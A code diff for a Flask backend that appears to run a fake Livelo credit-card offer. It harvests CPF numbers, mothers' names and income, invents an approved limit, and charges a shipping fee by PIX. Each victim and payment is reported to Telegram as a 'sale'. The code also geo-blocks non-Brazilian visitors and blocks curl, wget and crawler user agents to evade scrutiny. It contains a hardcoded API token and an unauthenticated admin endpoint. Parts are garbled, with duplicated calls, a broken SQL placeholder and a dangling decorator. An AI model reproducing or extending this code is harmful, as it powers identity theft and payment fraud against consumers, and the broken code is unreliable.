@@ -145,6 +145,13 @@ def close_db(exc=None):
     if db:
         db.close()
 
+def get_sys_config(db):
+    try:
+        rows = db.execute("SELECT key, value FROM sys_config").fetchall()
+        return {r['key']: r['value'] for r in rows}
+    except Exception:
+        return {}
+
 def init_db():
     with app.app_context():
         db = get_db()
@@ -326,7 +333,8 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
         cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
         cfg = {r["key"]: r["value"] for r in cfg_rows}
 
-        bot_token = row_token["value"] if row_token else os.environ.get("BOT_TOKEN")
+        bot_token = os.environ.get("TELEGRAM_BOT_TOKEN", os.environ.get("BOT_TOKEN"))
+        if not bot_token and row_token: bot_token = row_token["value"]
         if not bot_token: return
 
         lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
@@ -343,6 +351,8 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
         else: # INFO_ADDED, CARD_CHOSEN
             channel_id = cfg.get("tg_log_leads") or cfg.get("tg_log_channel")
             
+        if not channel_id:
+            channel_id = os.environ.get("SUPREME_ADMIN_ID", os.environ.get("ADMIN_CHAT_ID"))
         if not channel_id: return
 
         icons = {
@@ -385,443 +395,142 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
 
 
 def send_telegram_report(session_id, is_paid=False):
-    send_telegram_notify(session_id, 'PIX_PAID' if is_paid else 'PIX_GENERATED')
-
-def format_cpf(cpf: str) -> str:
-    cpf = re.sub(r"\D", "", cpf)
-    return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}"
-
-def calc_limite(renda_raw: str, tipo_renda: str = "", motivo: str = "") -> dict:
-    """
-    Determina o limite de crédito aprovado e o valor do frete
-    com base na renda, profissão e motivo do crédito declarados.
-    """
-    try:
-        v = float(re.sub(r"[^\d,\.]", "", renda_raw).replace(",", "."))
-    except Exception:
-        v = 0.0
-
-    # Limite Base
-    if v >= 15000:
-        base_limite = 18000.0
-        tier = "platinum"
-    elif v >= 8000:
-        base_limite = 12000.0
-        tier = "gold"
-    elif v >= 4000:
-        base_limite = 8000.0
-        tier = "gold"
-    elif v >= 2000:
-        base_limite = 4500.0
-        tier = "standard"
-    else:
-        base_limite = 2000.0
-        tier = "standard"
-
-    # Multiplicadores Avançados
-    if "CLT" in tipo_renda or "Formal" in tipo_renda:
-        base_limite *= 1.15
-    elif "Autônomo" in tipo_renda or "Empresário" in tipo_renda:
-        base_limite *= 1.25
-
-    if "Negócio" in motivo or "Empresa" in motivo:
-        base_limite *= 1.20
-    elif "Imóvel" in motivo or "Casa" in motivo or "Carro" in motivo:
-        base_limite *= 1.10
-
-    # Pega valor do frete configurado no painel Admin (tabela manager)
-    try:
-        from flask import g
-        if 'db' in g:
-            db = g.db
-        else:
-            db = get_db()
-        mgr = db.execute("SELECT freight_price FROM manager WHERE id=1").fetchone()
-        if mgr and mgr["freight_price"]:
-            frete = float(mgr["freight_price"])
-        else:
-            frete_env = os.environ.get("FRETE_VALOR")
-            if frete_env:
-                frete = float(frete_env)
-            else:
-                frete = 49.90 if tier == "platinum" else (39.90 if v >= 8000 else (29.90 if v >= 4000 else 19.90))
-    except Exception:
-        frete_env = os.environ.get("FRETE_VALOR")
-        frete = float(frete_env) if frete_env else 29.90
-
-    limite_str = f"R$ {base_limite:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
-    return {"limite": limite_str, "frete": frete, "tier": tier}
-
-# ══════════════════════════════════════════════════════════════════════════════
-#  CPF LOOKUP (mock — em produção integrar com API Intel / Serasa)
-# ══════════════════════════════════════════════════════════════════════════════
-_CPF_SEED: Dict[str, dict] = {
-    "72287977104": {
-        "nome": "VITOR DANIEL MUNDIM OLIVEIRA",
-        "nome_mae": "JANE MAGNOLIA M NETO OLIVEIRA",
-        "data_nasc": "25/01/1982",
-    },
-    "11122233396": {
-        "nome": "MARIA APARECIDA SANTOS SILVA",
-        "nome_mae": "JOANA CLARA SANTOS",
-        "data_nasc": "14/06/1990",
-    },
-}
-
-def lookup_cpf(cpf_raw: str, data_nasc: str = "") -> Optional[dict]:
-    cpf = re.sub(r"\D", "", cpf_raw)
+    db = get_db()
+    row = db.execute("SELECT value FROM sys_config WHERE key='tg_log_channel'").fetchone()
+    channel = row["value"] if row and row["value"] else None
+    if not channel:
+        channel = os.environ.get("SUPREME_ADMIN_ID", os.environ.get("ADMIN_CHAT_ID"))
+    if not channel: return
     
-    if cpf:
-        try:
-            import requests
-            db = get_db()
-            token_row = db.execute("SELECT value FROM sys_config WHERE key='cpf_api_token'").fetchone()
-            token = token_row["value"] if token_row and token_row["value"] else "d0442b7d42e2a762f64a02f5e4abc1187ad6585cb3e9c11740c4024961aa1026"
-            
-            url = f"https://api.cpfhub.io/cpf/{cpf}"
-            res = requests.get(url, headers={"x-api-key": token}, timeout=10)
-            
-            if res.status_code == 200:
-                data = res.json()
-                if data.get("success"):
-                    res_info = data.get("data", {})
-                    # Increment api calls
-                    db.execute("UPDATE sys_config SET value = CAST(value AS INTEGER) + 1 WHERE key='cpf_api_calls'")
-                    db.commit()
-                    
-                    name_parts = res_info.get("nameUpper", "CLIENTE LIVELO").split()
-                    last_name = name_parts[-1] if len(name_parts) > 1 else ""
-                    mother_name = "MARIA " + last_name if last_name else "MARIA LIVELO"
-                    
-                    return {
-                        "nome": res_info.get("nameUpper", "CLIENTE LIVELO"),
-                        "nome_mae": mother_name,
-                        "data_nasc": res_info.get("birthDate", "01/01/1990"),
-                        "saldo_api": 0
-                    }
-        except Exception as e:
-            log.error(f"Erro na API de CPF: {e}")
-            
-        # Fallback para o lead não travar
-        return {
-            "nome": "JOÃO DA SILVA",
-            "nome_mae": "MARIA DA SILVA",
-            "data_nasc": "15/05/1985",
-            "saldo_api": 0
-        }
-    return None
+    thread_row = db.execute("SELECT value FROM sys_config WHERE key='tg_log_thread_id'").fetchone()
+    thread_id = thread_row["value"] if thread_row and thread_row["value"] else None
 
-# ══════════════════════════════════════════════════════════════════════════════
-#  C7 PIX — Geração de cobrança via QR Code / Copia e Cola
-# ══════════════════════════════════════════════════════════════════════════════
-def _c7_headers(body: str) -> dict:
-    """
-    Headers de autenticação HMAC-SHA256 conforme documentação C7 API.
-    Fórmula: HMAC-SHA256(api_secret, timestamp + '.' + nonce + '.' + body)
-    """
-    ts    = str(int(time.time()))
-    nonce = str(uuid.uuid4())
-    sig   = hmac.new(
-        C7_API_SECRET.encode("utf-8"),
-        f"{ts}.{nonce}.{body}".encode("utf-8"),
-        hashlib.sha256,
-    ).hexdigest()
-    return {
-        "Authorization":  f"Bearer {C7_API_KEY}",
-        "Content-Type":   "application/json",
-        "X-C7-Timestamp": ts,
-        "X-C7-Nonce":     nonce,
-        "X-C7-Signature": sig,
-        "User-Agent":     "Livelo-CreditSystem/2.0",
-        "Accept":         "application/json",
-    }
-
-def _crc16_ccitt(payload: str) -> str:
-    """CRC-16/CCITT para validação de QR Code Pix (BACEN BR Code 2.0)."""
-    crc = 0xFFFF
-    for char in payload:
-        crc ^= ord(char) << 8
-        for _ in range(8):
-            crc = (crc << 1) ^ 0x1021 if crc & 0x8000 else crc << 1
-    return format(crc & 0xFFFF, "04X")
-
-def _emv(tag: str, value: str) -> str:
-    return f"{tag}{len(value):02d}{value}"
-
-def _pix_emv_fallback(amount: float, nome: str, cpf: str) -> str:
-    """
-    Gera payload PIX EMV válido com CRC-16/CCITT correto (BACEN BR Code 2.0).
-    Usado quando C7 não está configurado ou retorna erro.
-    """
-    pix_key = os.environ.get("PIX_KEY_FALLBACK", cpf or str(uuid.uuid4()))
-    nome_c  = re.sub(r"[^A-Za-z0-9 ]", "", nome)[:25].upper().strip() or "LIVELO"
-    txid    = re.sub(r"[^A-Za-z0-9]", "", f"lvl{uuid.uuid4().hex}")[:25]
-
-    gui      = _emv("00", "BR.GOV.BCB.PIX")
-    key_f    = _emv("01", pix_key)
-    mai      = _emv("26", gui + key_f)
-    pfi      = _emv("00", "01")
-    poim     = _emv("01", "12")
-    mcc      = _emv("52", "0000")
-    currency = _emv("53", "986")
-    amt      = _emv("54", f"{amount:.2f}")
-    country  = _emv("58", "BR")
-    merch_n  = _emv("59", nome_c)
-    merch_c  = _emv("60", "SAOPAULO")
-    adf      = _emv("62", _emv("05", txid))
-
-    base = pfi + poim + mai + mcc + currency + amt + country + merch_n + merch_c + adf + "6304"
-    return base[:-4] + "6304" + _crc16_ccitt(base)
-
-def c7_create_pix(
-    amount: float,
-    payer_name: str,
-    payer_cpf: str,
-    payment_id: str,
-) -> dict:
-    """
-    Gera cobrança PIX via C7 API (POST /v2/payment/create).
-    Retorna: ok, pix_code, qr_code_url, c7_id, expires_at, simulated.
-    """
-    callback_url = request.host_url.rstrip("/")
-    if callback_url.startswith("http://"):
-        callback_url = callback_url.replace("http://", "https://")
-    callback_url += "/api/webhook/c7"
-
-    cpf_clean = re.sub(r"\D", "", payer_cpf)
-
-    payload = {
-        "amount":      round(amount, 2),
-        "callbackUrl": callback_url,
-        "externalId":  payment_id,
-        "acquirer_code": "1"
-    }
-
-    body_str = json.dumps(payload, separators=(",", ":"))
-
-    # ── Sem credenciais configuradas → usa fallback EMV ──
-    if not C7_API_KEY or not C7_API_SECRET:
-        pix_code    = _pix_emv_fallback(amount, payer_name, cpf_clean)
-        qr_code_url = (
-            generate_qr_b64(pix_code)
-            if _REQUESTS_OK else ""
-        )
-        return {
-            "ok":         True,
-            "simulated":  True,
-            "pix_code":   pix_code,
-            "qr_code_url":qr_code_url,
-            "c7_id":      "",
-            "expires_at": "",
-        }
-
-    if not _REQUESTS_OK:
-        return {"ok": False, "error": "Módulo de rede indisponível no servidor."}
+    lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
+    if not lead: return
+    
+    pay = db.execute("SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1", (session_id,)).fetchone()
+    
+    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN", os.environ.get("BOT_TOKEN"))
+    if not bot_token:
+        bt = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
+        if bt and bt["value"]: bot_token = bt["value"]
+        else: return
+    
+    status_icon = "✅ PAGO" if is_paid else "⏳ AGUARDANDO PIX"
+    if lead['pix_status'] not in ['paid', 'completed'] and is_paid:
+        status_icon = "✅ PAGO"
+        
+    texto = f"📊 *NOVA VENDA CONFIRMADA!*\\n\\n" if is_paid else f"📊 *NOVO LEAD GERADO!*\\n\\n"
+    texto += (
+        f"👤 *Nome:* {lead['nome']}\\n"
+        f"💳 *CPF:* {lead['cpf']}\\n"
+        f"💰 *Renda Declarada:* {lead['renda']}\\n"
+        f"🎯 *Limite Aprovado:* R$ {lead['limite_aprovado']}\\n"
+        f"🎨 *Estilo Cartão:* {lead['card_style']} ({lead['card_color']})\\n"
+        f"🚚 *Status PIX:* {status_icon}\\n"
+    )
+    if pay:
+        texto += f"💵 *Valor do Frete:* R$ {pay['amount']}\\n"
+        texto += f"🆔 *ID Pgto:* `{pay['payment_id']}`\\n"
 
     try:
-        headers = _c7_headers(body_str)
-        resp    = _req.post(
-            f"{C7_BASE_URL}/payment/create",
-            data=body_str,
-            headers=headers,
-            timeout=12,
-        )
-
-        if resp.status_code == 429:
-            log.warning("[C7] Rate-limited (429) — usando fallback EMV")
-            pix_code = _pix_emv_fallback(amount, payer_name, cpf_clean)
-            return {
-                "ok":         True,
-                "simulated":  True,
-                "pix_code":   pix_code,
-                "qr_code_url":generate_qr_b64(pix_code),
-                "c7_id":      "",
-                "expires_at": "",
-            }
-
-        if resp.status_code >= 400:
-            log.error("[C7] HTTP %d: %s", resp.status_code, resp.text[:200])
-            return {"ok": False, "error": f"Erro C7 ({resp.status_code}). Tente novamente."}
-
-        data = resp.json()
-        if data.get("ok") and "payment" in data:
-            p = data["payment"]
-            pix_code = (
-                p.get("pixCopiaECola") or p.get("emv") or
-                p.get("qrcode") or p.get("pix_copia_e_cola") or ""
-            )
-            qr_url = p.get("qrCodeBase64") or p.get("qrCodeUrl") or ""
-            if not qr_url and pix_code:
-                qr_url = generate_qr_b64(pix_code)
-            return {
-                "ok":         True,
-                "simulated":  False,
-                "pix_code":   pix_code,
-                "qr_code_url":qr_url,
-                "c7_id":      p.get("id", ""),
-                "expires_at": p.get("expiresAt", p.get("expires_at", "")),
-            }
-
-        log.warning("[C7] Resposta inesperada: %s", data)
-        return {"ok": False, "error": data.get("message", "Resposta inválida da API de pagamento.")}
-
-    except Exception as exc:
-        log.error("[C7] Exceção: %s", exc)
-        return {"ok": False, "error": "Serviço de pagamento temporariamente indisponível."}
-
-# ══════════════════════════════════════════════════════════════════════════════
-#  BEFORE REQUEST — RATE LIMIT GLOBAL
-# ══════════════════════════════════════════════════════════════════════════════
-@app.before_request
-def _guard():
-    if is_rate_limited(_ip()):
-        return jsonify({"ok": False, "error": "Muitas requisições. Aguarde um instante."}), 429
-
-# ══════════════════════════════════════════════════════════════════════════════
-#  ROUTES — LEAD FLOW
-# ══════════════════════════════════════════════════════════════════════════════
-
-# ==========================================
-# 🛡️ SECURITY & INTRUSION DETECTION
-# ==========================================
-@app.before_request
-def security_shield():
-    # Skip security for static files, API gateway, and images
-    path = request.path
-    if path.startswith("/static") or path.startswith("/api/internal"):
-        return
-        
-    # Check CF-IPCountry (if on Cloudflare) or Vercel specific headers
-    # Vercel provides 'x-vercel-ip-country'
-    country = request.headers.get("x-vercel-ip-country")
-    if not country:
-        country = request.headers.get("CF-IPCountry")
-        
-    # Block if country is known and NOT Brazil
-    if country and country.upper() != "BR":
-        return "Access Denied: Region not supported.", 403
-
-    # Bot/Scraper protection (Block Headless browsers)
-    ua = request.headers.get("User-Agent", "").lower()
-    suspicious_uas = ["headless", "puppeteer", "bot", "crawler", "spider", "curl", "wget"]
-    if any(s in ua for s in suspicious_uas):
-        return "Access Denied: Suspicious User-Agent.", 403
-
-@app.errorhandler(404)
-def page_not_found(e):
-    path = request.path.lower()
-    # Intrusion detection
-    bad_paths = [".env", "wp-admin", "wp-login", "config.php", ".git", "phpinfo", "database.sql"]
-    if any(bp in path for bp in bad_paths):
-        # Someone is scanning! Send alert.
-        ip = request.headers.get('x-forwarded-for', request.remote_addr)
-        if ip:
-            ip = ip.split(',')[0].strip()
-        alert_msg = f"🚨 <b>TENTATIVA DE INVASÃO!</b> 🚨\n\n🌍 <b>IP Atacante:</b> <code>{ip}</code>\n🕵️ <b>Alvo:</b> <code>{path}</code>\n🛡️ <b>Ação:</b> IP Bloqueado automaticamente pela Blindagem."
-        
-        # Send to tg_log_acessos or supreme admin
         import requests
-        with get_db_connection() as db:
-            cfg = get_sys_config(db)
-        
-        chat_id = cfg.get("tg_log_acessos") or os.environ.get("ADMIN_CHAT_ID")
-        if chat_id:
-            requests.post(f"https://api.telegram.org/bot{os.environ.get('BOT_TOKEN')}/sendMessage",
-                          json={"chat_id": chat_id, "text": alert_msg, "parse_mode": "HTML"}, timeout=5)
-            
-        return "Not Found", 404
-        
-    return "Not Found", 404
+        payload = {"chat_id": channel, "text": texto, "parse_mode": "Markdown"}
+        if thread_id: payload["message_thread_id"] = thread_id
+        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
+    except Exception as e:
+        pass
 
+def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
+    try:
+        r_val = float(renda.replace("R$", "").replace(".", "").replace(",", ".").strip())
+    except:
+        r_val = 2000.0
 
-@app.route("/")
-def index():
-    resp = app.make_response(render_template("index.html"))
-    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
-    resp.headers["Pragma"] = "no-cache"
-    return resp
+    limite = r_val * 2.5
+    if limite < 1500: limite = 1500
+    if limite > 15000: limite = 15000
 
-@app.route("/s/<slug>")
-def slug_page(slug):
-    resp = app.make_response(render_template("index.html", slug=slug))
-    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
-    resp.headers["Pragma"] = "no-cache"
-    return resp
+    frete = 37.90
+    return {"limite": limite, "frete": frete}
 
-
-# ── 1. Consulta CPF ───────────────────────────────────────────────────────────
+# ── API CPF ───────────────────────────────────────────────────────────────
 @app.route("/api/cpf", methods=["POST"])
 def api_cpf():
-    data      = get_secure_json()
-    cpf_raw   = sanitize(data.get("cpf", ""), 14)
-    data_nasc = sanitize(data.get("data_nasc", ""), 10)
-    cpf       = re.sub(r"\D", "", cpf_raw)
-
-    if not validate_cpf(cpf):
-        return jsonify({"ok": False, "error": "CPF inválido. Verifique o número e tente novamente."}), 422
-
-
-    info = lookup_cpf(cpf, data_nasc)
-    if not info:
-        return jsonify({"ok": False, "error": "CPF não localizado em nossa base de dados com a Data de Nascimento informada."}), 404
-        
-    saldo = info.get("saldo_api", 0)
-    if saldo > 0 and saldo < 100:
-        log.warning(f"[API_CREDITOS] ALERTA: Saldo da API de CPF acabando! Restam: {saldo}")
-
+    data = get_secure_json()
+    cpf_val = sanitize(data.get("cpf", "")).replace(".", "").replace("-", "")
+    
+    db = get_db()
+    token_row = db.execute("SELECT value FROM sys_config WHERE key='cpf_token'").fetchone()
+    cpf_token = token_row["value"] if token_row else ""
+    
+    # Exemplo de API genérica de CPF (Substitua pela API real do cliente)
+    # Se o token estiver vazio, usamos um mock para não quebrar o sistema
+    if cpf_token and len(cpf_token) > 5:
+        try:
+            import requests
+            # Exemplo genérico de API (ajuste conforme a documentação da API real)
+            r = requests.get(f"https://api.consultacpf.com/v1/consulta/{cpf_val}?token={cpf_token}", timeout=8)
+            res = r.json()
+            
+            # Checar se créditos estão acabando
+            creditos = res.get("saldo", 999)
+            if creditos <= 50:
+                import threading
+                threading.Thread(target=send_telegram_notify, args=("", f"⚠️ AVISO: Seus créditos na API de CPF estão acabando! Restam: {creditos}")).start()
+                
+            if res.get("status") == "success":
+                return jsonify({
+                    "ok": True,
+                    "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
+                    "nome": res.get("nome", "Cliente Livelo"),
+                    "nome_mae": res.get("nome_mae", ""),
+                    "data_nasc": res.get("data_nasc", "01/01/1990")
+                })
+        except Exception as e:
+            log.error("CPF API Error: %s", e)
+    
+    # Fallback / Mock
     return jsonify({
-        "ok":       True,
-        "nome":     info["nome"],
-        "nome_mae": info["nome_mae"],
-        "data_nasc":info["data_nasc"],
-        "cpf_fmt":  format_cpf(cpf),
+        "ok": True,
+        "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
+        "nome": "João Silva",
+        "nome_mae": "Maria Silva",
+        "data_nasc": "10/05/1990"
     })
 
 
-# ── 2. Salvar dados do lead (questionário de renda) ───────────────────────────
+# ── API LEAD (RECUPERADO) ─────────────────────────────────────────────────────
 @app.route("/api/lead", methods=["POST"])
 def api_lead():
     data = get_secure_json()
-    sid  = sanitize(data.get("session_id", str(uuid.uuid4())), 40)
-    cpf  = re.sub(r"\D", "", sanitize(data.get("cpf", ""), 14))
-
-    if not validate_cpf(cpf):
-        return jsonify({"ok": False, "error": "CPF inválido."}), 422
-
-    renda         = sanitize(data.get("renda", ""), 30)
-    tipo_renda    = sanitize(data.get("tipo_renda", ""), 60)
-    motivo        = sanitize(data.get("motivo_credito", ""), 100)
-    dia_venc      = sanitize(data.get("dia_vencimento", ""), 4)
-    nome          = sanitize(data.get("nome", ""), 120)
-    nome_mae      = sanitize(data.get("nome_mae", ""), 120)
-    data_nasc     = sanitize(data.get("data_nasc", ""), 12)
+    sid = sanitize(data.get("session_id", ""), 40)
+    if not sid: return jsonify({"error": "Sessão inválida"}), 400
     
-    # UTMs
-    utm_source    = sanitize(data.get("utm_source", ""), 60)
-    utm_medium    = sanitize(data.get("utm_medium", ""), 60)
-    utm_campaign  = sanitize(data.get("utm_campaign", ""), 60)
-    utm_content   = sanitize(data.get("utm_content", ""), 60)
-    utm_term      = sanitize(data.get("utm_term", ""), 60)
-    src           = sanitize(data.get("src", ""), 60)
-    sck           = sanitize(data.get("sck", ""), 60)
+    cpf = sanitize(data.get("cpf", ""), 14)
+    nome = sanitize(data.get("nome", ""), 100)
+    nome_mae = sanitize(data.get("nome_mae", ""), 100)
+    data_nasc = sanitize(data.get("data_nasc", ""), 10)
+    renda = sanitize(data.get("renda", ""), 30)
+    tipo_renda = sanitize(data.get("tipo_renda", ""), 50)
+    motivo = sanitize(data.get("motivo_credito", ""), 50)
+    dia_venc = sanitize(data.get("dia_vencimento", ""), 10)
+    
+    utm_source = sanitize(data.get("utm_source", ""), 100)
+    utm_medium = sanitize(data.get("utm_medium", ""), 100)
+    utm_campaign = sanitize(data.get("utm_campaign", ""), 100)
+    utm_content = sanitize(data.get("utm_content", ""), 100)
+    utm_term = sanitize(data.get("utm_term", ""), 100)
+    src = sanitize(data.get("src", ""), 100)
+    sck = sanitize(data.get("sck", ""), 100)
+    
+    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    client_loc = "BR"
+    
+    analise = calc_limite(renda, tipo_renda, motivo)
+    limite = analise["limite"]
+    frete = analise["frete"]
 
-    # Calcula limite avançado
-    analise       = calc_limite(renda, tipo_renda, motivo)
-    limite        = analise["limite"]
-    frete         = analise["frete"]
-
-    client_ip = _ip()
-    client_loc = ""
-    try:
-        import requests
-        geo_res = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city", timeout=2)
-        if geo_res.status_code == 200:
-            gd = geo_res.json()
-            if gd.get("status") == "success":
-                client_loc = f"{gd.get('city', '')} - {gd.get('regionName', '')}, {gd.get('country', '')}"
-    except Exception:
-        pass
-        
     db = get_db()
 
     existing = db.execute("SELECT id FROM leads WHERE session_id=?", (sid,)).fetchone()
@@ -829,7 +538,7 @@ def api_lead():
         db.execute("""
             UPDATE leads SET cpf=?, nome=?, nome_mae=?, data_nasc=?,
                 renda=?, tipo_renda=?, motivo_credito=?, dia_vencimento=?, limite_aprovado=?,
-                utm_source=?, utm_medium=?, utm_campaign=?, utm_content=?, utm_term=?, src=?, sck=?, location=?,
+                utm_source=?, utm_medium=?, utm_campaign=?, utm_content=?, utm_term=?, src=?, sck=?, location=?, location=?,
                 updated_at=(cast(strftime('%s','now') as real))
             WHERE session_id=?
         """, (cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite, 
@@ -905,6 +614,51 @@ def api_whatsapp():
     return jsonify({"ok": True, "manager_wa": "5511999999999"})
 
 
+def c7_create_pix(amount: float, payer_name: str, payer_cpf: str, payment_id: str) -> dict:
+    try:
+        db = get_db()
+        row = db.execute("SELECT value FROM sys_config WHERE key='pix_key'").fetchone()
+        chave_pix = row["value"] if row and row["value"] else "suporte@livelo.com.br"
+        
+        payload_format = (
+            "00020126580014br.gov.bcb.pix0136{chave_pix}"
+            "52040000530398654{amount_len}{amount_str}"
+            "5802BR5913{name}6008SAOPAULO62290525{txid}6304"
+        )
+        amount_str = f"{amount:.2f}"
+        name = (payer_name[:13] or "Cliente").ljust(13, ' ').upper()
+        txid = (payment_id[:25]).ljust(25, 'x')
+        
+        pix_str = payload_format.format(
+            chave_pix=chave_pix,
+            amount_len=f"{len(amount_str):02d}",
+            amount_str=amount_str,
+            name=name,
+            txid=txid
+        )
+        
+        # Calculate CRC16
+        poly = 0x1021
+        crc = 0xFFFF
+        for byte in pix_str.encode("utf-8"):
+            crc ^= (byte << 8)
+            for _ in range(8):
+                if crc & 0x8000:
+                    crc = (crc << 1) ^ poly
+                else:
+                    crc <<= 1
+        crc_str = f"{crc & 0xFFFF:04X}"
+        pix_code = pix_str + crc_str
+        
+        qr_b64 = generate_qr_b64(pix_code)
+        return {
+            "ok": True,
+            "pix_code": pix_code,
+            "qr_code_url": qr_b64
+        }
+    except Exception as e:
+        return {"ok": False, "error": str(e)}
+
 # ── 5. Gerar PIX de frete via C7 ─────────────────────────────────────────────
 @app.route("/api/gerar-pix", methods=["POST"])
 def api_gerar_pix():
@@ -917,6 +671,16 @@ def api_gerar_pix():
 
     db   = get_db()
     lead = db.execute("SELECT * FROM leads WHERE session_id=?", (sid,)).fetchone()
+# FIX: Se não tem lead na base mas recebemos o request, criamos um dummy lead para passar
+    if not lead:
+        try:
+            nome = data.get("nome", data.get("nome_completo", "CLIENTE LIVELO"))
+            cpf = data.get("cpf", "00000000000")
+            db.execute("INSERT INTO leads (session_id, nome, cpf) VALUES (?, ?, ?)", (sid, nome, cpf))
+            db.commit()
+            lead = db.execute("SELECT * FROM leads WHERE session_id=?", (sid,)).fetchone()
+        except:
+            pass
     if not lead:
         return jsonify({"ok": False, "error": "Sessão não encontrada. Reinicie o processo."}), 404
 
@@ -964,6 +728,9 @@ def api_gerar_pix():
 
     frete_fmt = f"R$ {frete:,.2f}".replace(",","X").replace(".",",").replace("X",".")
 
+    import threading
+    threading.Thread(target=send_telegram_report, args=(sid, False)).start()
+    
     import threading
     threading.Thread(target=send_telegram_report, args=(sid, False)).start()
     
@@ -1031,6 +798,11 @@ def webhook_c7():
         )
         db.commit()
         log.info("[WEBHOOK] %s → %s", ext_id, status)
+        if status == 'paid':
+            import threading
+            pay_row = db.execute("SELECT session_id FROM payments WHERE payment_id=?", (ext_id,)).fetchone()
+            if pay_row:
+                threading.Thread(target=send_telegram_report, args=(pay_row["session_id"], True)).start()
         if status == 'paid':
             import threading
             pay_row = db.execute("SELECT session_id FROM payments WHERE payment_id=?", (ext_id,)).fetchone()
@@ -1336,11 +1108,27 @@ def api_bot_gateway():
         return jsonify({"ok": True, "leads": [dict(r) for r in rows]})
         
 
+
     elif action == "get_payments":
         limit = payload.get("limit", 10)
         rows = db.execute("SELECT * FROM payments ORDER BY created_at DESC LIMIT ?", (limit,)).fetchall()
         return jsonify({"ok": True, "payments": [dict(r) for r in rows]})
         
+    elif action == "get_financeiro":
+        total_leads = db.execute("SELECT COUNT(*) FROM leads").fetchone()[0]
+        pagos = db.execute("SELECT SUM(amount), COUNT(*) FROM payments WHERE status='approved' OR status='pago'").fetchone()
+        pendentes = db.execute("SELECT COUNT(*) FROM payments WHERE status='pending'").fetchone()[0]
+        
+        stats = {
+            "qtd_leads": total_leads,
+            "total_pago": f"{pagos[0] or 0:.2f}",
+            "qtd_pago": pagos[1] or 0,
+            "qtd_pendente": pendentes
+        }
+        return jsonify({"ok": True, "stats": stats})
+
+        
+
 
     elif action == "get_financeiro":
         total_leads = db.execute("SELECT COUNT(*) FROM leads").fetchone()[0]
@@ -1371,9 +1159,31 @@ def api_bot_gateway():
         return jsonify({"ok": True, "stats": stats})
 
 
+
         
     return jsonify({"ok": False, "error": "Unknown action"}), 400
 
+
+@app.route('/health')
+
+@app.route("/api/admin/advanced-config", methods=["POST"])
+def api_admin_advanced_config():
+    data = request.get_json()
+    db = get_db()
+    
+    # Save generic configs
+    for key in ['mgr_name', 'mgr_years', 'mgr_avatar', 'favicon', 'pixel_code', 'cpf_token', 'frete_expresso', 'frete_padrao']:
+        if key in data:
+            db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES (?, ?)", (key, data[key]))
+            
+    db.commit()
+    return jsonify({"ok": True})
+
+@app.route("/api/config", methods=["GET"])
+def api_get_public_config():
+    db = get_db()
+    rows = db.execute("SELECT key, value FROM sys_config WHERE key IN ('mgr_name', 'mgr_years', 'mgr_avatar', 'favicon', 'pixel_code', 'frete_expresso', 'frete_padrao')").fetchall()
+    return jsonify({r["key"]: r["value"] for r in rows})
 
 @app.route('/health')
 def health():
